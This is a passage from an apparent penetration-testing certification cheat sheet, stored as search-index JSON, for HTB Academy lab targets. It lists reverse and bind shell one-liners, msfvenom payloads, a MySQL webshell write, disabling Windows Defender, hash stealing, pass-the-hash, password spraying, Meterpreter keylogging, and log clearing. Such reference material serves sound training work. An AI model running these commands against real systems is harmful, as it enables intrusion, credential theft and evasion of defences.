VHost Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code> Parameter Fuzzing - GET <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST <code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#wordlists","title":"Wordlists","text":"Command Description <code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code> Directory/Page Wordlist <code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code> Extensions Wordlist <code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code> Domain Wordlist <code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code> Parameters Wordlist","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#misc","title":"Misc","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP academy.htb\" &gt;&gt; /etc/hosts'</code> Add DNS entry <code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code> Create Sequence Wordlist <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> curl w/ POST","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#shells-payloads","title":"Shells &amp; Payloads","text":"Commands Description <code>xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!</code> CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol <code>env</code> Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use <code>sudo nc -lvnp &lt;port #&gt;</code> Starts a\u00a0<code>netcat</code>\u00a0listener on a specified port <code>nc -nv &lt;ip address of computer with listener started&gt;&lt;port being listened on&gt;</code> Connects to a netcat listener at the specified IP address and port <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \\| /bin/bash -i 2&gt;&amp;1 \\| nc -l 10.129.41.200 7777 &gt; /tmp/f</code> Uses netcat to bind a shell (<code>/bin/bash</code>) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on <code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"</code> <code>Powershell</code>\u00a0one-liner used to connect back to a listener that has been started on an attack box <code>Set-MpPreference -DisableRealtimeMonitoring $true</code> Powershell command using to disable real time monitoring in\u00a0<code>Windows Defender</code> <code>use exploit/windows/smb/psexec</code> Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing\u00a0<code>smb</code>\u00a0&amp;\u00a0<code>psexec</code> <code>shell</code> Command used in a meterpreter shell session to drop into a\u00a0<code>system shell</code> <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; nameoffile.elf</code> <code>MSFvenom</code>\u00a0command used to generate a linux-based reverse shell\u00a0<code>stageless payload</code> <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; nameoffile.exe</code> MSFvenom command used to generate a Windows-based reverse shell stageless payload <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho &gt; nameoffile.macho</code> MSFvenom command used to generate a MacOS-based reverse shell payload <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp &gt; nameoffile.asp</code> MSFvenom command used to generate a ASP web reverse shell payload <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw &gt; nameoffile.jsp</code> MSFvenom command used to generate a JSP web reverse shell payload <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war &gt; nameoffile.war</code> MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload <code>use auxiliary/scanner/smb/smb_ms17_010</code> Metasploit exploit module used to check if a host is vulnerable to\u00a0<code>ms17_010</code> <code>use exploit/windows/smb/ms17_010_psexec</code> Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010 <code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce</code> Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting\u00a0<code>rConfig 3.9.6</code> <code>python -c 'import pty; pty.spawn(\"/bin/sh\")'</code> Python command used to spawn an\u00a0<code>interactive shell</code>\u00a0on a linux-based system <code>/bin/sh -i</code> Spawns an interactive shell on a linux-based system <code>perl \u2014e 'exec \"/bin/sh\";'</code> Uses\u00a0<code>perl</code>\u00a0to spawn an interactive shell on a linux-based system <code>ruby: exec \"/bin/sh\"</code> Uses\u00a0<code>ruby</code>\u00a0to spawn an interactive shell on a linux-based system <code>Lua: os.execute('/bin/sh')</code> Uses\u00a0<code>Lua</code>\u00a0to spawn an interactive shell on a linux-based system <code>awk 'BEGIN {system(\"/bin/sh\")}'</code> Uses\u00a0<code>awk</code>\u00a0command to spawn an interactive shell on a linux-based system <code>find / -name nameoffile 'exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;</code> Uses\u00a0<code>find</code>\u00a0command to spawn an interactive shell on a linux-based system <code>find . -exec /bin/sh \\; -quit</code> An alternative way to use the\u00a0<code>find</code>\u00a0command to spawn an interactive shell on a linux-based system <code>vim -c ':!/bin/sh'</code> Uses the text-editor\u00a0<code>VIM</code>\u00a0to spawn an interactive shell. Can be used to escape \"jail-shells\" <code>ls -la &lt;path/to/fileorbinary&gt;</code> Used to\u00a0<code>list</code>\u00a0files &amp; directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute <code>sudo -l</code> Displays the commands that the currently logged on user can run as\u00a0<code>sudo</code> <code>/usr/share/webshells/laudanum</code> Location of\u00a0<code>laudanum webshells</code>\u00a0on ParrotOS and Pwnbox <code>/usr/share/nishang/Antak-WebShell</code> Location of\u00a0<code>Antak-Webshell</code>\u00a0on Parrot OS and Pwnbox <p>Download Cheatsheet</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#metasploit","title":"Metasploit","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#msfconsole-commands","title":"MSFconsole Commands","text":"Command Description <code>show exploits</code> Show all exploits within the Framework. <code>show payloads</code> Show all payloads within the Framework. <code>show auxiliary</code> Show all auxiliary modules within the Framework. <code>search &lt;name&gt;</code> Search for exploits or modules within the Framework. <code>info</code> Load information about a specific exploit or module. <code>use &lt;name&gt;</code> Load an exploit or module (example: use windows/smb/psexec). <code>use &lt;number&gt;</code> Load an exploit by using the index number displayed after the search\u00a0command. <code>LHOST</code> Your local host\u2019s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. <code>RHOST</code> The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). <code>setg &lt;function&gt;</code> Set a specific value globally (for example, LHOST or RHOST). <code>show options</code> Show the options available for a module or exploit. <code>show targets</code> Show the platforms supported by the exploit. <code>set target &lt;number&gt;</code> Specify a specific target index if you know the OS and service pack. <code>set payload &lt;payload&gt;</code> Specify the payload to use. <code>set payload &lt;number&gt;</code> Specify the payload index number to use after the show payloads command. <code>show advanced</code> Show advanced options. <code>set autorunscript migrate -f</code> Automatically migrate to a separate process upon exploit completion. <code>check</code> Determine whether a target is vulnerable to an attack. <code>exploit</code> Execute the module or exploit and attack the target. <code>exploit -j</code> Run the exploit under the context of the job. (This will run the exploit in the background.) <code>exploit -z</code> Do not interact with the session after successful exploitation. <code>exploit -e &lt;encoder&gt;</code> Specify the payload encoder to use (example: exploit \u2013e shikata_ga_nai). <code>exploit -h</code> Display help for the exploit command. <code>sessions -l</code> List available sessions (used when handling multiple shells). <code>sessions -l -v</code> List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. <code>sessions -s &lt;script&gt;</code> Run a specific Meterpreter script on all Meterpreter live sessions. <code>sessions -K</code> Kill all live sessions. <code>sessions -c &lt;cmd&gt;</code> Execute a command on all live Meterpreter sessions. <code>sessions -u &lt;sessionID&gt;</code> Upgrade a normal Win32 shell to a Meterpreter console. <code>db_create &lt;name&gt;</code> Create a database to use with database-driven attacks (example: db_create autopwn). <code>db_connect &lt;name&gt;</code> Create and connect to a database for driven attacks (example: db_connect autopwn). <code>db_nmap</code> Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as \u2013sT \u2013v \u2013P0.) <code>db_destroy</code> Delete the current database. <code>db_destroy &lt;user:password@host:port/database&gt;</code> Delete database using advanced options.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#meterpreter-commands","title":"Meterpreter Commands","text":"Command Description <code>help</code> Open Meterpreter usage help. <code>run &lt;scriptname&gt;</code> Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. <code>sysinfo</code> Show the system information on the compromised target. <code>ls</code> List the files and folders on the target. <code>use priv</code> Load the privilege extension for extended Meterpreter libraries. <code>ps</code> Show all running processes and which accounts are associated with each process. <code>migrate &lt;proc. id&gt;</code> Migrate to the specific process ID (PID is the target process ID gained from the ps command). <code>use incognito</code> Load incognito functions. (Used for token stealing and impersonation on a target machine.) <code>list_tokens -u</code> List available tokens on the target by user. <code>list_tokens -g</code> List available tokens on the target by group. <code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code> Impersonate a token available on the target. <code>steal_token &lt;proc. id&gt;</code> Steal the tokens available for a given process and impersonate that token. <code>drop_token</code> Stop impersonating the current token. <code>getsystem</code> Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. <code>shell</code> Drop into an interactive shell with all available tokens. <code>execute -f &lt;cmd.exe&gt; -i</code> Execute cmd.exe and interact with it. <code>execute -f &lt;cmd.exe&gt; -i -t</code> Execute cmd.exe with all available tokens. <code>execute -f &lt;cmd.exe&gt; -i -H -t</code> Execute cmd.exe with all available tokens and make it a hidden process. <code>rev2self</code> Revert back to the original user you used to compromise the target. <code>reg &lt;command&gt;</code> Interact, create, delete, query, set, and much more in the target\u2019s registry. <code>setdesktop &lt;number&gt;</code> Switch to a different screen based on who is logged in. <code>screenshot</code> Take a screenshot of the target\u2019s screen. <code>upload &lt;filename&gt;</code> Upload a file to the target. <code>download &lt;filename&gt;</code> Download a file from the target. <code>keyscan_start</code> Start sniffing keystrokes on the remote target. <code>keyscan_dump</code> Dump the remote keys captured on the target. <code>keyscan_stop</code> Stop sniffing keystrokes on the remote target. <code>getprivs</code> Get as many privileges as possible on the target. <code>uictl enable &lt;keyboard/mouse&gt;</code> Take control of the keyboard and/or mouse. <code>background</code> Run your current Meterpreter shell in the background. <code>hashdump</code> Dump all hashes on the target. use sniffer Load the sniffer module. <code>sniffer_interfaces</code> List the available interfaces on the target. <code>sniffer_dump &lt;interfaceID&gt; pcapname</code> Start sniffing on the remote target. <code>sniffer_start &lt;interfaceID&gt; packet-buffer</code> Start sniffing with a specific range for a packet buffer. <code>sniffer_stats &lt;interfaceID&gt;</code> Grab statistical information from the interface you are sniffing. <code>sniffer_stop &lt;interfaceID&gt;</code> Stop the sniffer. <code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code> Add a user on the remote target. <code>add_group_user &lt;\"Domain Admins\"&gt; &lt;username&gt; -h &lt;ip&gt;</code> Add a username to the Domain Administrators group on the remote target. <code>clearev</code> Clear the event log on the target machine. <code>timestomp</code> Change file attributes, such as creation date (antiforensics measure). <code>reboot</code> Reboot the target machine.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-common-services","title":"Attacking common services","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-ftp","title":"Attacking FTP","text":"Command Description <code>ftp 192.168.2.142</code> Connecting to the FTP server using the\u00a0<code>ftp</code>\u00a0client. <code>nc -v 192.168.2.142 21</code> Connecting to the FTP server using\u00a0<code>netcat</code>. <code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code> Brute-forcing the FTP service. <code>medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121</code> Brute-forcing the FTP service.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-smb","title":"Attacking SMB","text":"Command Description <code>smbclient -N -L //10.129.14.128</code> Null-session testing against the SMB service. <code>smbmap -H 10.129.14.128</code> Network share enumeration using\u00a0<code>smbmap</code>. <code>smbmap -H 10.129.14.128 -r notes</code> Recursive network share enumeration using\u00a0<code>smbmap</code>. <code>smbmap -H 10.129.14.128 --download \"notes\\note.txt\"</code> Download a specific file from the shared folder. <code>smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\"</code> Upload a specific file to the shared folder. <code>rpcclient -U'%' 10.10.110.17</code> Null-session with the\u00a0<code>rpcclient</code>. <code>./enum4linux-ng.py 10.10.11.45 -A -C</code> Automated enumeratition of the SMB service using\u00a0<code>enum4linux-ng</code>. <code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'</code> Password spraying against different users from a list. <code>impacket-psexec administrator:'Password123!'@10.10.110.17</code> Connect to the SMB service using the\u00a0<code>impacket-psexec</code>. <code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code> Execute a command over the SMB service using\u00a0<code>crackmapexec</code>. <code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code> Enumerating Logged-on users. <code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code> Extract hashes from the SAM database. <code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code> Use the Pass-The-Hash technique to authenticate on the target host. <code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code> Dump the SAM database using\u00a0<code>impacket-ntlmrelayx</code>. <code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;base64 reverse shell&gt;</code> Execute a PowerShell based reverse shell using\u00a0<code>impacket-ntlmrelayx</code>.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-sql-databases","title":"Attacking SQL Databases","text":"Command Description <code>mysql -u julio -pPassword123 -h 10.129.20.13</code> Connecting to the MySQL server. <code>sqlcmd -S SRVMSSQL\\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30</code> Connecting to the MSSQL server. <code>sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h</code> Connecting to the MSSQL server from Linux. <code>sqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h</code> Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. <code>mysql&gt; SHOW DATABASES;</code> Show all available databases in MySQL. <code>mysql&gt; USE htbusers;</code> Select a specific database in MySQL. <code>mysql&gt; SHOW TABLES;</code> Show all available tables in the selected database in MySQL. <code>mysql&gt; SELECT * FROM users;</code> Select all available entries from the \"users\" table in MySQL. <code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code> Show all available databases in MSSQL. <code>sqlcmd&gt; USE htbusers</code> Select a specific database in MSSQL. <code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code> Show all available tables in the selected database in MSSQL. <code>sqlcmd&gt; SELECT * FROM users</code> Select all available entries from the \"users\" table in MSSQL. <code>sqlcmd&gt; EXECUTE sp_configure 'show advanced options', 1</code> To allow advanced options to be changed. <code>sqlcmd&gt; EXECUTE sp_configure 'xp_cmdshell', 1</code> To enable the xp_cmdshell. <code>sqlcmd&gt; RECONFIGURE</code> To be used after each sp_configure command to apply the changes. <code>sqlcmd&gt; xp_cmdshell 'whoami'</code> Execute a system command from MSSQL server. <code>mysql&gt; SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php'</code> Create a file using MySQL. <code>mysql&gt; show variables like \"secure_file_priv\";</code> Check if the the secure file privileges are empty to read locally stored files on the system. <code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code> Read local files in MSSQL. <code>mysql&gt; select LOAD_FILE(\"/etc/passwd\");</code> Read local files in MySQL. <code>sqlcmd&gt; EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'</code> Hash stealing using the\u00a0<code>xp_dirtree</code>\u00a0command in MSSQL. <code>sqlcmd&gt; EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'</code> Hash stealing using the\u00a0<code>xp_subdirs</code>\u00a0command in MSSQL. <code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code> Identify linked servers in MSSQL. <code>sqlcmd&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]</code> Identify the user and its privileges used for the remote connection in MSSQL.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-rdp","title":"Attacking RDP","text":"Command Description <code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code> Password spraying against the RDP service. <code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code> Brute-forcing the RDP service. <code>rdesktop -u admin -p password123 192.168.2.143</code> Connect to the RDP service using\u00a0<code>rdesktop</code>\u00a0in Linux. <code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code> Impersonate a user without its password. <code>net start sessionhijack</code> Execute the RDP session hijack. <code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code> Enable \"Restricted Admin Mode\" on the target Windows host. <code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code> Use the Pass-The-Hash technique to login on the target host without a password.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-dns","title":"Attacking DNS","text":"Command Description <code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code> Perform an AXFR zone transfer attempt against a specific name server. <code>subfinder -d inlanefreight.com -v</code> Brute-forcing subdomains. <code>host support.inlanefreight.com</code> DNS lookup for the specified subdomain.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#attacking-email-services","title":"Attacking Email Services","text":"Command Description <code>host -t MX microsoft.com</code> DNS lookup for mail servers for the specified domain. <code>dig mx inlanefreight.com \\| grep \"MX\" \\| grep -v \";\"</code> DNS lookup for mail servers for the specified domain. <code>host -t A mail1.inlanefreight.htb.</code> DNS lookup of the IPv4 address for the specified subdomain. <code>telnet 10.10.110.20 25</code> Connect to the SMTP server. <code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code> SMTP user enumeration using the RCPT command against the specified host. <code>python3 o365spray.py --validate --domain msplaintext.xyz</code> Verify the usage of Office365 for the specified domain. <code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code> Enumerate existing users using Office365 on the specified domain. <code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz</code> Password spraying against a list of users that use Office365 for the specified domain. <code>hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code> Brute-forcing the POP3 service. <code>swaks --from\u00a0notifications@inlanefreight.com\u00a0--to\u00a0employees@inlanefreight.com\u00a0--header 'Subject: Notification' --body 'Message' --server 10.10.11.213</code> Testing the SMTP service for the open-relay vulnerability.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#pivoting-tunneling-and-port-forwarding","title":"Pivoting, tunneling and port forwarding","text":"Command Description <code>ifconfig</code> Linux-based command that displays all current network configurations of a system. <code>ipconfig</code> Windows-based command that displays all system network configurations. <code>netstat -r</code> Command used to display the routing table for all IPv4-based protocols. <code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code> Nmap command used to scan a target for open ports allowing SSH or MySQL connections. <code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code> SSH comand used to create an SSH tunnel from a local machine on local port\u00a0<code>1234</code>\u00a0to a remote target using port 3306. <code>netstat -antp \\| grep 1234</code> Netstat option used to display network connections associated with a tunnel created. Using\u00a0<code>grep</code>\u00a0to filter based on local port\u00a0<code>1234</code>\u00a0. <code>nmap -v -sV -p1234 localhost</code> Nmap command used to scan a host through a connection that has been made on local port\u00a0<code>1234</code>. <code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code> SSH command that instructs the ssh client to request the SSH server forward all data via port\u00a0<code>1234</code>\u00a0to\u00a0<code>localhost:3306</code>. <code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code> SSH command used to perform a dynamic port forward on port\u00a0<code>9050</code>\u00a0and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. <code>tail -4 /etc/proxychains.conf</code> Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place. <code>proxychains nmap -v -sn 172.16.5.1-200</code> Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range\u00a0<code>172.16.5.1-200</code>\u00a0with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>). <code>proxychains nmap -v -Pn -sT 172.16.5.19</code> Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>). <code>proxychains msfconsole</code> Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy. <code>msf6 &gt; search rdp_scanner</code> Metasploit search that attempts to find a module called\u00a0<code>rdp_scanner</code>. <code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code> Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy. <code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code> Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following\u00a0<code>lhost=</code>\u00a0on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called\u00a0<code>backupscript.exe</code>. <code>msf6 &gt; use exploit/multi/handler</code> Used to select the multi-handler exploit module in Metasploit. <code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code> Uses secure copy protocol (<code>scp</code>) to transfer the file\u00a0<code>backupscript.exe</code>\u00a0to the specified host and places it in the Ubuntu user's home directory (<code>:~/</code>). <code>python3 -m http.server 8123</code> Uses Python3 to start a simple HTTP server listening on port\u00a0<code>8123</code>. Can be used to retrieve files from a host. <code>Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"</code> PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after\u00a0<code>-OutFile</code>. <code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code> SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port\u00a0<code>8080</code>\u00a0on the attack host to port\u00a0<code>80</code>\u00a0on the target. <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code> Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after\u00a0<code>LHOST=</code>\u00a0on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob. <code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code> Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>). <code>for i in {1..254} ;do (ping -c 1 172.16.5.$i \\| grep \"bytes from\" &amp;) ;done</code> For Loop used on a Linux-based system to discover devices in a specified network segment. <code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \\| find \"Reply\"</code> For Loop used on a Windows-based system to discover devices in a specified network segment. <code>1..254 \\| % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}</code> PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. <code>msf6 &gt; use auxiliary/server/socks_proxy</code> Metasploit command that selects the\u00a0<code>socks_proxy</code>\u00a0auxiliary module. <code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code> Metasploit command that lists all currently running jobs. <code>socks4 127.0.0.1 9050</code> Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. <code>Socks5 127.0.0.1 1080</code> Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port. <code>msf6 &gt; use post/multi/manage/autoroute</code> Metasploit command used to select the autoroute module. <code>meterpreter &gt; help portfwd</code> Meterpreter command used to display the features of the portfwd command. <code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code> Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. <code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code> Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly. <code>netstat -antp</code> Used to display all (<code>-a</code>) active network connections with associated process IDs.\u00a0<code>-t</code>\u00a0displays only TCP connections.<code>-n</code>\u00a0displays only numerical addresses.\u00a0<code>-p</code>\u00a0displays process IDs associated with each displayed connection. <code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code> Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port\u00a0<code>1234</code>\u00a0listening on the IP address of the Attack Host. <code>meterpreter &gt; bg</code> Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux <code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code> Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. <code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code> Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. <code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code> Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. <code>sudo apt-get install sshuttle</code> Uses apt-get to install the tool sshuttle. <code>sudo sshuttle -r\u00a0ubuntu@10.129.202.64\u00a0172.16.5.0 -v</code> Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>). <code>sudo git clone https://github.com/klsecservices/rpivot.git</code> Clones the rpivot project GitHub repository. <code>sudo apt-get install python2.7</code> Uses apt-get to install python2.7. <code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code> Used to run the rpivot server (<code>server.py</code>) on proxy port\u00a0<code>9050</code>, server port\u00a0<code>9999</code>\u00a0and listening on any IP address (<code>0.0.0.0</code>). <code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code> Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target. <code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code> Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port. <code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code> Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server. <code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code> Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code> Windows-based command that uses\u00a0<code>netsh.exe</code>\u00a0to configure a portproxy rule called\u00a0<code>v4tov4</code>\u00a0that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. <code>netsh.exe interface portproxy show v4tov4</code> Windows-based command used to view the configurations of a portproxy rule called v4tov4. <code>git clone https://github.com/iagox86/dnscat2.git</code> Clones the\u00a0<code>dnscat2</code>\u00a0project GitHub repository. <code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code> Used to start the 